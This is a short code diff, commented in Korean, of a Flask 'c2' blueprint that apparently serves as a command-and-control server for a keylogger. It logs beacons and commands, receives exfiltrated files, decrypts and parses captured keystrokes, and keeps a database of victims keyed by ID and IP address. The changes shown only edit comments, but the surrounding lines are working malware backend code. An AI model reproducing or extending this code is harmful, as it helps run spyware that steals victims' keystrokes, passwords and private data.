@@ -17,7 +17,7 @@ c2_bp = Blueprint('c2', __name__)
 BEACON_LOG_FILE = 'logs/beacon_log.json'
 COMMAND_LOG_FILE = 'logs/command_log.json'
 EXFIL_LOG_FILE = 'logs/exfil_log.json'
-VICTIMS_DB_FILE = 'logs/victims_db.json'  # ← 새로 추가: 피해자 DB
+VICTIMS_DB_FILE = 'logs/victims_db.json'  # 피해자 DB
 
 def load_json_log(filepath):
     """JSON 로그 파일 로드"""
@@ -88,7 +88,7 @@ def decrypt_keylog_blocks(file_content):
         
     except Exception as e:
         logging.error(f"블록 단위 복호화 실패: {e}")
-        return decrypt_keylog_data(file_content)  # 폴백
+        return decrypt_keylog_data(file_content)  
 
 # ═══════════════════════════════════════════════════════════
 # 3. 키로그 내용 파싱 기능 추가
@@ -406,7 +406,7 @@ def receive_exfiltration():
             logging.error("파일 내용이 비어있음")
             return jsonify({'error': '파일 내용이 없습니다'}), 400
         
-        # ← 추가: 키로그 데이터 복호화 및 파싱
+        # 키로그 데이터 복호화 및 파싱
         decrypted_content = None
         parsed_keylog = None
         
@@ -438,7 +438,7 @@ def receive_exfiltration():
                 with open(parsed_path, 'w', encoding='utf-8') as f:
                     json.dump(parsed_keylog, f, ensure_ascii=False, indent=2)
         
-        # ← 추가: 피해자 정보 업데이트
+        # 피해자 정보 업데이트
         victim_info = update_victim_info(
             victim_id, 
             request.remote_addr, 
@@ -534,7 +534,7 @@ def receive_beacon():
             'received_data': data
         }
         
-        # ← 추가: 피해자 정보 업데이트
+        # 피해자 정보 업데이트
         update_victim_info(victim_id, request.remote_addr, 'beacon')
         
         # 파일에 저장
